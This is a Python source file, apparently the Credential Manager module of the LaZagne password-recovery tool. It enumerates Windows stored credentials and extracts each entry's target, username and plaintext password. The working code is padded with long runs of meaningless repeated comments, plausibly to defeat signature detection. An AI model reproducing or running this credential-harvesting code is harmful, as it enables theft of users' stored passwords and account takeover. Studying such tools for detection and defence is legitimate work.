# -*- coding: utf-8 -*- 
from lazagne.config.module_info import ModuleInfo
from lazagne.config.winstructure import *
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
class Credman(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'credman', 'windows', only_from_current_user=True)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
    def run(self):
        pwd_found = []
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
        creds = POINTER(PCREDENTIAL)()
        count = c_ulong()
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
        if CredEnumerate(None, 0, byref(count), byref(creds)) == 1:
            for i in range(count.value):
                c = creds[i].contents
                if c.Type == CRED_TYPE_GENERIC or c.Type == CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
                    # Remove password too long
                    if c.CredentialBlobSize.real < 200:
                        pwd_found.append({
                            'URL': c.TargetName,
                            'Login': c.UserName,
                            'Password': c.CredentialBlob[:c.CredentialBlobSize.real]  # \\x00 could be deleted
                        })
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
            CredFree(creds)
        return pwd_found
